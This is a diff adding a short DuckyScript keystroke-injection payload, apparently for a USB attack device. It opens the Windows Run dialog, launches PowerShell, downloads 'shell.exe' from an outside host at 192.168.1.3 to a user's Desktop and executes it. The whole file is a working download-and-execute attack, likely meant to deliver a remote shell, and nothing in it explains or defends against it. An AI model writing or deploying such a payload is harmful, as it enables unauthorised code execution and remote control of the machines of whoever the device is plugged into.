@@ -1,0 +1,13 @@
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 250
+STRING (new-object System.Net.WebClient).DownloadFile("http://192.168.1.3/shell.exe", "c:\Users\cobalt\Desktop\shell.exe")
+DELAY 500
+ENTER
+DELAY 350
+STRING c:\Users\cobalt\Desktop\shell.exe
+DELAY 200
+ENTER
+DELAY 350
